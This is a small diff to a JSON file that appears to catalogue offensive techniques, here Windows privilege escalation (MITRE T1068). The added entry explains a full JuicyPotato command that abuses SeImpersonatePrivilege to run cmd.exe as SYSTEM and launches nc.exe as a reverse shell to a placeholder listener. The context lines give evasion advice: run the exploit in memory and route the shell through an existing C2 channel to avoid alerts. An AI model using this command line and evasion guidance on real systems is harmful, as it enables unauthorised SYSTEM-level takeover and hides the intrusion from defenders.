@@ -105,5 +105,6 @@
       "MITRE T1068"
     ],
     "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet - the noisy part is the spawned shell, so route it through an existing C2 channel."
-  }
+  },
+  "explain": "Abuses SeImpersonatePrivilege via DCOM/BITS to capture a SYSTEM token (JuicyPotato):\n  JuicyPotato.exe          the potato exploit\n  -l 53375                 the local COM server port it listens on\n  -p c:\\windows\\system32\\cmd.exe   the program to launch as SYSTEM\n  -a \"/c c:\\tools\\nc.exe <lhost> <lport> -e cmd.exe\"   its arguments (here a reverse shell)\n  -t *                     try both token-creation methods\nWorks on pre-2019 Windows; use PrintSpoofer/GodPotato on newer builds."
 }
